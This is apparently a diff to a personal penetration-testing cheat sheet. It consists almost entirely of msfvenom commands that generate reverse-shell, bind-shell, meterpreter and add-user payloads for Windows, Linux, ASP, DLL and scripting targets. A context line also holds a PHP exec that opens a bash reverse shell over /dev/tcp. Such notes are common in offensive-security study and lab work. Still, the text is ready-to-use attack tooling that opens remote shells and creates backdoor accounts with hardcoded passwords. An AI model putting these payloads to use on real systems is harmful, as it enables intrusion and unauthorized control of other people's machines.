@@ -73,21 +73,23 @@ var = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/IP/PORT 0>&1\'"); ?>';
 msfvenom --list payloads | grep <search>
 
 # windows
-msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
-msfvenom -p windows/adduser USER=kashz PASS=iamkashz@123 -f exe -o k_adduser.exe
+msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
+msfvenom -p windows/adduser USER=kashz PASS=iamr00t123z -f exe -o k_adduser.exe
 msfvenom -p windows/exec CMD="" -a x86 --platform Windows -f exe -o k_cmd.exe
-msfvenom -p windows/adduser USER=kashz PASS='kashz@!azCD' -f exe -o kashz.exe
 msfvenom -p windows/shell_bind_tcp RHOST= LPORT= -f python
 # asp
 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f asp -o kshell.asp
 msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f aspx -o kshell.aspx
+# dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f dll -o kashz.dll
 
 # linux
-msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= -f elf -o kshell.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -f elf -o kshell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= -f elf -o kshell.elf
 msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o scp
-
+# js_le
+msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= -f js_le -e generic/none
 # so shell
 msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -f elf-so -o utils.so
 
@@ -101,8 +103,6 @@ msfvenom -p nodejs/shell_reverse_tcp LHOST= LPORT=
 msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw -o [.pl | .cgi]
 # python
 msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw -o kshell.py
-# js_le
-msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT= -f js_le -e generic/none
 
 # meterpreter
 msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
